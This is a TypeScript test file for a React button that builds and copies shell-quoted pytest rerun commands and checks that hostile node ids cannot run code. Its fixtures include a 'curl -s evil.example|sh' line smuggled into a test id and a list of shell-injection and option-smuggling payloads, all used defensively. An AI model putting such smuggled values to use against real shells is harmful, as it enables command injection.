import { spawnSync } from 'node:child_process';
import { act, fireEvent, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { isHidden } from '../lib/visible';
import { pytestArg, RerunButton, rerunCommand, rerunFile, shellQuote } from './RerunButton';

const UART = 'tests/comms/test_uart.py::test_framing_at_921600';
const RAIL = 'tests/power/test_rails.py::test_rail_ripple[3V3]';

function ids(n: number): string[] {
  return Array.from({ length: n }, (_, i) => `tests/test_many.py::test_case[${i}]`);
}

// A text's lines as Python's str.splitlines gives them, as pytest reads a file of arguments.
function splitlines(text: string): string[] {
  const breaks = [0x0a, 0x0b, 0x0c, 0x0d, 0x1c, 0x1d, 0x1e, 0x85, 0x2028, 0x2029];
  const lines: string[] = [];
  let line = '';
  for (const ch of text) {
    if (breaks.includes(ch.codePointAt(0) ?? 0)) {
      lines.push(line);
      line = '';
    } else line += ch;
  }
  if (line) lines.push(line);
  return lines;
}

function stubClipboard() {
  const writeText = vi.fn(() => Promise.resolve());
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
  return writeText;
}

afterEach(() => {
  vi.restoreAllMocks();
  vi.useRealTimers();
});

describe('the command', () => {
  it('quotes a node id for a POSIX shell only where it needs it', () => {
    expect(shellQuote(UART)).toBe(UART);
    expect(shellQuote('tests/a-b/test_x.py::test_y@2,3+4=5%')).toBe(
      'tests/a-b/test_x.py::test_y@2,3+4=5%',
    );
    expect(shellQuote(RAIL)).toBe(`'${RAIL}'`);
    expect(shellQuote('tests/test_a.py::test_x[a b]')).toBe("'tests/test_a.py::test_x[a b]'");
    expect(shellQuote('tests/test_a.py::test_x[$HOME]')).toBe("'tests/test_a.py::test_x[$HOME]'");
    expect(shellQuote("tests/test_a.py::test_x[it's]")).toBe("'tests/test_a.py::test_x[it'\\''s]'");
    expect(shellQuote('tests/test_a.py::test_x["q"]')).toBe(`'tests/test_a.py::test_x["q"]'`);
    expect(shellQuote('')).toBe("''");
  });

  it('runs pytest on exactly the given tests and adds no --vantage', () => {
    expect(rerunCommand([UART, RAIL])).toBe(`pytest ${UART} '${RAIL}'`);
    expect(rerunCommand([UART])).not.toContain('--vantage');
  });

  it('never lets a node id be read as an option or a file of arguments', () => {
    // pytest would take the first as its temporary directory, emptying .git, and the second as a
    // file to read more arguments from.
    expect(rerunCommand(['--basetemp=.git', '@x', '-pevil', UART])).toBe(
      `pytest ./--basetemp=.git ./@x ./-pevil ${UART}`,
    );
    expect(rerunCommand(['--junitxml=../a b'])).toBe("pytest './--junitxml=../a b'");
    expect(pytestArg('tests/-a.py::t')).toBe('tests/-a.py::t');
    expect(pytestArg('tests/a.py::t[-1]')).toBe('tests/a.py::t[-1]');
  });

  it('writes control and hidden characters as escapes, so the command carries none', () => {
    const RLO = String.fromCodePoint(0x202e);
    // Pasted raw, ^U would erase the line so far and the line break run what followed it.
    expect(shellQuote('t.py::t\u0015curl -s evil.example|sh\n')).toBe(
      "'t.py::t'$'\\025''curl -s evil.example|sh'$'\\012'",
    );
    expect(rerunCommand([`suite.py::test_hostile_id[${RLO}gnp.exe]`])).toBe(
      "pytest 'suite.py::test_hostile_id['$'\\342\\200\\256''gnp.exe]'",
    );
    // Only the runs of tabs, C1 controls and characters shown as code points go in $'...', as
    // bytes; quotes and backslashes stay in plain single quotes.
    expect(shellQuote("a'b\\c\td\u0085\u200be")).toBe(
      "'a'\\''b\\c'$'\\011''d'$'\\302\\205\\342\\200\\213''e'",
    );
    expect(shellQuote('\u200b')).toBe("$'\\342\\200\\213'");
    // A quote alone still goes in single quotes.
    expect(shellQuote("it's")).toBe("'it'\\''s'");
    for (const id of ['t\u0015x', `t${RLO}x`, 't\u001bx', 't\u2028x', 't\ufffdx']) {
      const cmd = rerunCommand([id]);
      expect(cmd).toMatch(/^[\x20-\x7e]*$/);
    }
  });

  it("never puts a quote in $'...', so a shell without it keeps its quoting in step", () => {
    // Each word is plain single-quoted runs, escaped quotes and $'...' runs of octal escapes
    // alone: dash reads such a run as a $ and a quoted string, and no quote in it ends one early.
    const word = /^(?:'[^']*'|\\'|\$'(?:\\[0-7]{3})+')+$/;
    for (const id of HOSTILE) expect(shellQuote(pytestArg(id))).toMatch(word);
  });
});

// Node ids a report could send to run a command in the shell the rerun is pasted into: a control
// or hidden character to make the id need escapes, then a quote, then shell text.
const HOSTILE = [
  "x.py::t[\u0015'; echo INJECTED #]",
  "tests/a.py::t\u200b'; echo INJECTED #",
  't.py::t\ufffd\'"$(echo INJECTED)"\'',
  "t.py::t[\u202e'\\''; echo INJECTED; ']",
  "t.py::t\\\u0015\\'; echo INJECTED #",
  "\u200b'; echo INJECTED #",
  "-x\u0085'; echo INJECTED #",
  "t.py::t\n'; echo INJECTED #",
  't.py::t\t`echo INJECTED`',
  "it's",
  '',
];

// The shells a pasted command meets that this machine has: bash, zsh and busybox's ash read
// $'...'; dash, /bin/sh on Debian and Ubuntu, posh and older yash do not.
const SHELLS: [string, ...string[]][] = [
  ['bash'],
  ['dash'],
  ['busybox', 'sh'],
  ['zsh', '-f'],
  ['mksh'],
  ['posh'],
  ['yash'],
];

function run(sh: readonly string[], script: string) {
  const [cmd = '', ...args] = sh;
  // No startup file or variable, as BASH_ENV, adds to what the shell prints.
  return spawnSync(cmd, [...args, '-c', script], {
    timeout: 5000,
    env: { PATH: process.env.PATH ?? '/usr/bin:/bin' },
  });
}

function present(sh: readonly string[]): boolean {
  const done = run(sh, 'exit 0');
  return !done.error && done.status === 0;
}

// A character's UTF-8 bytes as three-digit octal escapes.
function octal(ch: string): string {
  return Array.from(
    new TextEncoder().encode(ch),
    (b) => `\\${b.toString(8).padStart(3, '0')}`,
  ).join('');
}

// What a shell without $'...' reads for a node id: each run of escaped characters as a $ and their
// escapes, as text.
function literally(id: string): string {
  let out = '';
  let escaping = false;
  for (const ch of id) {
    const cp = ch.codePointAt(0) ?? 0;
    const escaped = cp < 0x20 || isHidden(cp);
    if (escaped && !escaping) out += '$';
    out += escaped ? octal(ch) : ch;
    escaping = escaped;
  }
  return out;
}

describe('the command in a shell', () => {
  for (const sh of SHELLS) {
    it.skipIf(!present(sh))(
      `${sh.join(' ')} reads each node id as one argument and runs nothing else`,
      () => {
        const dollar = run(sh, "printf %s $'\\101'").stdout.toString() === 'A';
        for (const id of HOSTILE) {
          // pytest stands in as a function that prints how many arguments it was given, and the
          // first: anything else printed was run by the node id.
          const out = run(
            sh,
            `pytest() { printf '%s\\n' "$#" "$1"; }\n${rerunCommand([id])}\n`,
          ).stdout.toString();
          const arg = dollar ? pytestArg(id) : literally(pytestArg(id));
          expect(out, `${sh.join(' ')}: ${JSON.stringify(id)}`).toBe(`1\n${arg}\n`);
        }
      },
    );
  }
});

describe('copying', () => {
  it('shows the command as its tooltip and description, and copies it', async () => {
    const writeText = stubClipboard();
    render(<RerunButton nodeids={[UART, RAIL]}>Copy rerun of 2 new failures</RerunButton>);
    const cmd = `pytest ${UART} '${RAIL}'`;
    const button = screen.getByRole('button', { name: 'Copy rerun of 2 new failures' });
    expect(button).toHaveAccessibleDescription(cmd);
    expect(button).toHaveClass('dl-btn', 'dl-btn--secondary', 'dl-btn--sm');
    expect(button).not.toHaveAttribute('aria-keyshortcuts');
    expect(screen.getByRole('tooltip', { hidden: true })).toHaveTextContent(cmd);
    const live = document.querySelector('[aria-live="polite"]');
    expect(live).toHaveTextContent(/^$/);
    fireEvent.click(button);
    expect(writeText).toHaveBeenCalledWith(cmd);
    expect(cmd).not.toContain('--vantage');
    expect(await screen.findByRole('button', { name: 'Copied' })).toBe(button);
    expect(live).toHaveTextContent(`Copied ${cmd}`);
  });

  it('says Copied only for a moment', async () => {
    stubClipboard();
    vi.useFakeTimers();
    render(<RerunButton nodeids={[UART]} />);
    const button = screen.getByRole('button', { name: 'Copy rerun command' });
    await act(async () => {
      fireEvent.click(button);
    });
    expect(button).toHaveTextContent('Copied');
    act(() => {
      vi.advanceTimersByTime(1600);
    });
    expect(button).toHaveTextContent('Copy rerun command');
    expect(document.querySelector('[aria-live="polite"]')).toHaveTextContent(/^$/);
  });

  it('copies a command it is given in place of its own', () => {
    const writeText = stubClipboard();
    render(<RerunButton nodeids={[UART]} command="python -m pytest -p no:cacheprovider x" />);
    fireEvent.click(screen.getByRole('button'));
    expect(writeText).toHaveBeenCalledWith('python -m pytest -p no:cacheprovider x');
  });

  it('prints its key inside the button and sets it as the shortcut', () => {
    render(
      <RerunButton nodeids={[UART]} variant="primary" keyHint="c" size="md">
        Copy rerun command
      </RerunButton>,
    );
    const button = screen.getByRole('button', { name: 'Copy rerun command' });
    expect(button).toHaveAttribute('aria-keyshortcuts', 'c');
    expect(button).toHaveClass('dl-btn--primary');
    expect(button).not.toHaveClass('dl-btn--sm');
    const kbd = button.querySelector('kbd');
    expect(kbd).toHaveTextContent('c');
    expect(kbd).toHaveClass('dl-kbd');
    expect(kbd).toHaveAttribute('aria-hidden', 'true');
  });

  it('renders nothing without node ids', () => {
    const { container } = render(<RerunButton nodeids={[]} />);
    expect(container).toBeEmptyDOMElement();
  });
});

describe('past its limit', () => {
  function stubDownload() {
    const blobs: Blob[] = [];
    const create = vi.fn((b: Blob) => {
      blobs.push(b);
      return 'blob:http://localhost/0d7e';
    });
    const revoke = vi.fn();
    Object.defineProperty(URL, 'createObjectURL', { value: create, configurable: true });
    Object.defineProperty(URL, 'revokeObjectURL', { value: revoke, configurable: true });
    const clicked: { href: string; download: string; attached: boolean }[] = [];
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
      this: HTMLAnchorElement,
    ) {
      clicked.push({
        href: this.getAttribute('href') ?? '',
        download: this.download,
        attached: document.body.contains(this),
      });
    });
    return { blobs, revoke, clicked };
  }

  it('copies a command for 20 node ids', () => {
    render(<RerunButton nodeids={ids(20)} fileName="new-failures.txt" />);
    expect(screen.getByRole('button', { name: 'Copy rerun command' })).toBeInTheDocument();
    expect(screen.queryByText(/Download/)).toBeNull();
  });

  it('offers a file of 21 for pytest @file, one node id a line', async () => {
    const { blobs, revoke, clicked } = stubDownload();
    vi.useFakeTimers();
    const list = ids(21);
    const { container } = render(<RerunButton nodeids={list} fileName="new-failures.txt" />);
    // The file opens with --, so options go before it.
    expect(container.querySelector('.dl-rerun__hint')).toHaveTextContent(
      'then run pytest [options] @new-failures.txt',
    );
    expect(container.querySelector('.dl-rerun__hint code')).toHaveTextContent(
      'pytest [options] @new-failures.txt',
    );
    fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
    expect(clicked).toEqual([
      { href: 'blob:http://localhost/0d7e', download: 'new-failures.txt', attached: true },
    ]);
    expect(document.querySelector('a[download]')).toBeNull();
    expect(blobs).toHaveLength(1);
    expect(blobs[0]?.type).toBe('text/plain');
    expect(await blobs[0]?.text()).toBe(`${['--', ...list].join('\n')}\n`);
    expect(revoke).not.toHaveBeenCalled();
    act(() => {
      vi.runAllTimers();
    });
    expect(revoke).toHaveBeenCalledWith('blob:http://localhost/0d7e');
  });

  it('opens its file with --, and never lets a line be an option or another file', async () => {
    const { blobs } = stubDownload();
    const list = ['--basetemp=.git', '@other.txt', ...ids(19)];
    render(<RerunButton nodeids={list} fileName="new-failures.txt" />);
    fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
    expect(await blobs[0]?.text()).toBe(
      `${['--', './--basetemp=.git', './@other.txt', ...ids(19)].join('\n')}\n`,
    );
  });

  it('leaves out a node id holding a line break, and says so', async () => {
    const { blobs } = stubDownload();
    const broken = [
      'tests/x.py::t\u2028--basetemp=.git',
      'tests/x.py::t\n-x',
      'tests/x.py::t\r1',
      'tests/x.py::t\u000b2',
      'tests/x.py::t\u000c3',
      'tests/x.py::t\u001c4',
      'tests/x.py::t\u00855',
      'tests/x.py::t\u20296',
    ];
    const kept = ids(21);
    const { container } = render(
      <RerunButton nodeids={[...broken, ...kept]} fileName="new-failures.txt" />,
    );
    expect(container).toHaveTextContent(
      '8 node ids hold a line break, so the file leaves them out',
    );
    fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
    const text = (await blobs[0]?.text()) ?? '';
    expect(text).toBe(`${['--', ...kept].join('\n')}\n`);
    // Split as pytest splits a file of arguments, every line is one it was given.
    expect(splitlines(text)).toEqual(['--', ...kept]);
    expect(rerunFile(broken)).toEqual({ text: '--\n', kept: 0, left: 8 });
  });

  it('offers no file when no node id fits one', () => {
    const { container } = render(
      <RerunButton nodeids={['a\nb', 'c\nd', 'e\nf']} limit={2} fileName="new-failures.txt" />,
    );
    expect(screen.queryByRole('button')).toBeNull();
    expect(container).toHaveTextContent(
      '3 node ids hold a line break, so the file leaves them out',
    );
  });

  it('takes its own limit, and names its file rerun.txt by default', () => {
    const { clicked } = stubDownload();
    const { container } = render(<RerunButton nodeids={[UART, RAIL, 'tests/c.py::t']} limit={2} />);
    expect(container.querySelector('.dl-rerun__hint')).toHaveTextContent(
      'pytest [options] @rerun.txt',
    );
    fireEvent.click(screen.getByRole('button', { name: 'Download 3 node ids' }));
    expect(clicked[0]?.download).toBe('rerun.txt');
  });
});
